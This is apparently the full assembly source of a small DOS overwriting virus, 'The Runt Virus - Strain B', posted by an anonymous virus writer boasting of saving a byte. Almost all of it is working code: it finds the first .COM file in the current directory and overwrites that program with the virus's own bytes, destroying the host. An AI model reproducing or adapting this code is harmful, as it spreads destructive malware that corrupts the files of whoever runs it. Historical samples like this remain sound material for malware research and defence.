;-----------
; The Runt Virus - Strain B
;-----------------
;
;  Note: It seems 'to the best of my ability' in the
;        Runt-A source was not nearly enough.  After
;        re-perusing the file for a few minutes i
;        noticed an area which i can save 1 byte! (wow'o'wow)
;
;             +------------------------------------------------+
;             | Written by a virus writer who wishes to remain |
;             | anonymous to prevent recognition.              |
;             +------------------------------------------------+

.model tiny
.code
org 100h

begin:
        lea     dx,com_files                    ; \
        mov     ah,4Eh                          ;  > Find *.COM
        int     21h                             ; /

        mov     ax,3D01h                        ; Open for write access.
        mov     cx,(offset eof-offset begin)    ; ..33 bytes to write..
        mov     dx,9eh                          ; 1st filename in DTA
        int     21h                             ;

        xchg    ax,bx                           ;
        mov     dx,si                           ;
        mov     ah,40h                          ; DOS write service
        int     21h                             ;

        retn                                    ; Back to DOS

com_files       db      '*.COM',0               ; First .COM file in the
                                                ; current directory.
eof:
        end     begin

